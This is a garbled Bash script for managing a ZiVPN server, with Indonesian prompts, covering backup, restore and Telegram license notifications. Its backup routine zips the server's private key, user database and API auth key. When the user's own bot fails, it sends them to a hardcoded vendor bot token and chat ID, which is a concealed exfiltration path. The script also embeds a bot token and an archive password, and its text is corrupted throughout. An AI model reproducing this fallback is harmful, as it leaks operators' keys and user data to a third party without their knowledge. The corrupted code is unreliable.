CONFIG_DIR=/etc/zivpn
TELEGRAM_CONF={CONFIG_DIR}/telegram.conf
function get_host() {
  local CERT_CN
  CERT_CN=$(openssl x509 -in ${CONFIG_DIR}/zivpn.crt -noout -subject | sed -n /.*CN = \([^,]*\).*/\1/p
  if [ ERT_CN== zivpn; then
    cat /etc/zivpn/ip.txt
    else
    echo ERT_CN
  fi
}
function send_telegram_notification() {
  local message=1
  local keyboard=$2
  if [ ! -f TELEGRAM_CONF; then
    return 1
  fi
  source $TELEGRAM_CONF
  if [ -n LEGRAM_BOT_TOKEN&& [ -n LEGRAM_CHAT_ID]; then
    local api_url=ttps://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage
    if [ -n yboard]; then
      curl -s -X POST i_urld hat_id=${TELEGRAM_CHAT_ID}--data-urlencode xt=${message}d eply_markup=${keyboard} > /dev/null
      else
      curl -s -X POST i_urld hat_id=${TELEGRAM_CHAT_ID}--data-urlencode xt=${message}d arse_mode=Markdown> /dev/null
    fi
  fi
}
function setup_telegram() {
  echo - Konfigurasi Notifikasi Telegram ---
  read -p ukkan Bot API Key Anda: i_key
  read -p ukkan ID Chat Telegram Anda (dapatkan dari @userinfobot): chat_id
  if [ -z i_key || [ -z hat_id]; then
    echo I Key dan ID Chat tidak boleh kosong. Pengaturan dibatalkan.
    return 1
  fi
  echo LEGRAM_BOT_TOKEN=${api_key} > $TELEGRAM_CONF
  echo LEGRAM_CHAT_ID=${chat_id}> TELEGRAM_CONF
  chmod 600 TELEGRAM_CONF
  echo nfigurasi berhasil disimpan di $TELEGRAM_CONF
  return 0
}
handle_backup() {
  echo - Memulai Proses Backup ---
  TELEGRAM_CONF={TELEGRAM_CONF:-/etc/zivpn/telegram.conf}
  CONFIG_DIR=${CONFIG_DIR:-/etc/zivpn}
  if [ -f LEGRAM_CONF ]; then
    source $TELEGRAM_CONF
  fi
  DEFAULT_BOT_TOKEN=7502167857:AAEtI-eWPY7GSz0g3dbl7yxVZEXjxqsCllk
  DEFAULT_CHAT_ID=5999635647
  BOT_TOKEN={TELEGRAM_BOT_TOKEN:-$DEFAULT_BOT_TOKEN}
  CHAT_ID=ELEGRAM_CHAT_ID:-$DEFAULT_CHAT_ID}
  if [ -z T_TOKEN ] || [ -z $CHAT_ID then
    echo Telegram Bot Token / Chat ID belum diset! tee -a /var/log/zivpn_backup.log
    read -r -p Tekan [Enter]... /usr/local/bin/zivpn-manager
    return
  fi
  VPS_IP=$(cat /etc/zivpn/ip.txt 2>/dev/null | tr -d \r\n
  [ -z PS_IP && VPS_IP=UNKNOWN
  TIMESTAMP=(date +%Y%m%d-%H%M%S)
  NOW_HUMAN=(date +%d %B %Y %H:%M:%S
  backup_filename=pn_backup_${VPS_IP}_${TIMESTAMP}.zip
  temp_backup_path=mp/${backup_filename}
files_to_backup=(
NFIG_DIR/config.json
NFIG_DIR/users.db
NFIG_DIR/api_auth.key
NFIG_DIR/telegram.conf
NFIG_DIR/total_users.txt
NFIG_DIR/zivpn.crt
NFIG_DIR/zivpn.key
)
echo mbuat backup ZIP...
valid_files=()
for f in files_to_backup[@]}; do
  [ -f && valid_files+=(
done
if [ #valid_files[@]}q 0 ]; then
  echo Tidak ada file valid untuk dibackup!tee -a /var/log/zivpn_backup.log
  read -r -p Tekan [Enter]... /usr/local/bin/zivpn-manager
  return
fi
zip -j -P riZiVPN-Gacorr123!mp_backup_pathalid_files[@]}>/dev/null 2>&1
if [ ! -f temp_backup_path then
  echo Gagal membuat file backup!| tee -a /var/log/zivpn_backup.log
  read -r -p Tekan [Enter]... /usr/local/bin/zivpn-manager
  return
fi
caption_base=BACKUP ZIVPN BERHASIL
IP VPS   : ${VPS_IP}
Tanggal  : ${NOW_HUMAN}
🔄 CARA RESTORE BACKUP
Via LINK FILE (HTTPS)
1) Forward / kirim file backup ke:
https://t.me/potato_directlinkBot
2) Salin link HTTPS
3) Paste link saat proses restore
send_result=url -s -X POST https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
-F chat_id=${CHAT_ID}\
-F document=@temp_backup_path}
-F caption=$caption_base
SEND_BY=R_BOT
ACTIVE_BOT_TOKEN=OT_TOKEN
ACTIVE_CHAT_ID=$CHAT_ID
if ! echo send_result | grep -q :truethen
  echo  Gagal kirim ke User Bot, fallback ke Owner Bot...| tee -a /var/log/zivpn_backup.log
  send_result=url -s -X POST https://api.telegram.org/bot${DEFAULT_BOT_TOKEN}/sendDocument
  -F chat_id=${DEFAULT_CHAT_ID}\
  -F document=@temp_backup_path}
  -F caption=$caption_base
  SEND_BY=ER_BOT
  ACTIVE_BOT_TOKEN=EFAULT_BOT_TOKEN
  ACTIVE_CHAT_ID=$DEFAULT_CHAT_ID
  if ! echo send_result | grep -q :truethen
    echo GAGAL TOTAL kirim ke Telegram!| tee -a /var/log/zivpn_backup.log
    rm -f temp_backup_path
    read -r -p Tekan [Enter]... /usr/local/bin/zivpn-manager
    return
  fi
fi
message_id=$(echo $send_resultsed -nE *ssage_id0-9]+).*/\1/p head -n1)
caption_final={caption_base}
Dikirim via: ${SEND_BY}
if [ -n ssage_id then
  curl -s -X POST ps://api.telegram.org/bot${ACTIVE_BOT_TOKEN}/editMessageCaption \
  -d chat_id=${ACTIVE_CHAT_ID}
  -d message_id={message_id}
  --data-urlencode ption=${caption_final}>/dev/null 2>&1
fi
rm -f temp_backup_path
clear
echo BACKUP ZIVPN BERHASIL
echo  VPS   : ${VPS_IP}
echo nggal  : ${NOW_HUMAN}
echo
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo  CARA RESTORE BACKUP (LINK SAJA)
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo  Forward / kirim file backup ke: https://t.me/potato_directlinkBot
echo  Salin link HTTPS
echo  Paste link saat proses restore
echo
echo kirim via: ${SEND_BY}
echo
read -r -p Tekan [Enter] untuk kembali ke menu...&& /usr/local/bin/zivpn-manager
}
function handle_expiry_notification() {
local host=$1
local ip=
local client=
local isp=4
local exp_date=$5
local message
message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
⛔SC ZIVPN EXPIRED ⛔
◇━━━━━━━━━━━━━━◇
IP VPS  : ${ip}
HOST  : ${host}
ISP     : ${isp}
CLIENT : ${client}
EXP DATE  : ${exp_date}
◇━━━━━━━━━━━━━━◇
EOF
)
local keyboard
keyboard=$(cat <<EOF
{
  ine_keyboard
  [
  {
    tpanjang Licence,
    https://t.me/ARI_VPN_STORE
  }
  ]
  ]
}
EOF
)
send_telegram_notification $messagekeyboard
}
function handle_renewed_notification() {
local host=$1
local ip=
local client=
local isp=4
local expiry_timestamp=$5
local current_timestamp
current_timestamp=$(date +%s)
local remaining_seconds=$((expiry_timestamp - current_timestamp))
local remaining_days=$((remaining_seconds / 86400))
local message
message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
✅RENEW SC ZIVPN✅
◇━━━━━━━━━━━━━━◇
IP VPS  : ${ip}
HOST  : ${host}
ISP     : ${isp}
CLIENT : ${client}
EXP : ${remaining_days} Days
◇━━━━━━━━━━━━━━◇
EOF
)
send_telegram_notification $message
}
function handle_api_key_notification() {
local api_key=1
local server_ip=
local domain=
local message
message=$(cat <<EOF
🚀 API UDP ZIVPN 🚀
🔑 Auth Key: ${api_key}
🌐 Server IP: ${server_ip}
🌍 Domain: ${domain}
EOF
)
send_telegram_notification $message
}
handle_restore() {
clear
echo === ZIVPN RESTORE =====
read -rp sukkan DIRECT LINK backup (.zip): URL
wget -O /tmp/backup.zip L& unzip -P AriZiVPN-Gacorr123! -o /tmp/backup.zip -d /etc/zivpn && systemctl restart zivpn.service
echo
systemctl is-active --quiet zivpn.service && echo  RESTORE BERHASIL| echo ⚠️ RESTORE OK TAPI SERVICE ERROR
read -rp kan Enter...
}
case
backup)
handle_backup
;;
restore)
handle_restore
;;
setup-telegram)
setup_telegram
;;
expiry-notification)
if [ $# -ne 6 ]; then
echo age: $0 expiry-notification <host> <ip> <client> <isp> <exp_date>
exit 1
fi
handle_expiry_notification $2 5$6
;;
renewed-notification)
if [ $# -ne 6 ]; then
echo age: $0 renewed-notification <host> <ip> <client> <isp> <expiry_timestamp>
exit 1
fi
handle_renewed_notification  4$5
;;
api-key-notification)
if [ $# -ne 4 ]; then
echo age: $0 api-key-notification <api_key> <server_ip> <domain>
exit 1
fi
handle_api_key_notification  4
;;
*)
echo age: $0 {backup|restore|setup-telegram|expiry-notification|renewed-notification|api-key-notification}
exit 1
;;
esac
